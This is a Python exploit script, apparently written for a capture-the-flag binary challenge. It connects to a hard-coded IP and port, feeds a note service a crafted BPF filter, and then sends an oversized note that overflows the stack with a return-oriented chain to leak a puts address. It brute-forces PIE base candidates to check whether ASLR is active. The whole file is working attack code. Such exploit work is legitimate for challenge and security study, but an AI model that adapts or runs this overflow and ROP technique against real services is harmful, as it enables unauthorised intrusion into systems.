#!/usr/bin/env python3
import socket, struct, time, sys
HOST, PORT = "144.79.188.39", 42698
BPF = struct.pack("<HBBI", 0x06, 0, 0, 0x7fff0000)
def recvu(s,d,t=3):
    s.settimeout(t); data=b""
    try:
        while d not in data:
            c=s.recv(1)
            if not c: break
            data+=c
    except socket.timeout: pass
    return data
def p64(x): return struct.pack("<Q",x)
def try_base(pie):
    try:
        s=socket.socket(); s.settimeout(5); s.connect((HOST,PORT))
        recvu(s,b"-1) exit\n"); s.sendall(b"0\n")
        recvu(s,b"1) use examples\n"); s.sendall(b"0\n")
        recvu(s,b"size?\n"); s.sendall(str(len(BPF)).encode()+b"\n")
        recvu(s,b"note?\n"); s.sendall(BPF)
        recvu(s,b"-1) exit\n"); s.sendall(b"3\n")
        recvu(s,b"-1) exit\n")
        s.sendall(b"5\n"); recvu(s,b"size?\n"); s.sendall(b"65600\n"); recvu(s,b"note?\n")
        RET=0x101a; POP_RDI=0x145b; GOT_PUTS=0x3f60; PLT_PUTS=0x1154; EXIT=0x1234
        st=(b"A"*0x68+p64(pie+0x4220)+p64(0)+p64(pie+RET)+p64(pie+POP_RDI)+p64(pie+GOT_PUTS)+p64(pie+PLT_PUTS)+p64(pie+EXIT))
        s.sendall(st)
        time.sleep(0.5); s.settimeout(2)
        out=b""
        try:
            while True:
                c=s.recv(4096)
                if not c: break
                out+=c
        except socket.timeout: pass
        s.close()
        return out
    except Exception as e:
        return b"ERR"

cands=set()
for p in ["55555555","56555555","55555540","56555540","55555556","55555545","56000000","55000000","55600000","55500000","56500000"]:
    for lo in ["4000","5000","6000","7000","8000","9000","a000","b000","c000","d000","0000","1000","2000","3000"]:
        cands.add(int(p+lo,16))
cands.update([0x555555554000,0x555555400000,0x565555554000])
print("trying",len(cands),"bases")
found=False
for base in sorted(cands):
    out=try_base(base)
    if out and out not in (b"ERR",b"") and len(out)>=3:
        print(f"  HIT {hex(base)}: {out!r}")
        found=True
        break
if not found:
    print("NO HIT -> ASLR is ON (random base per connection)")
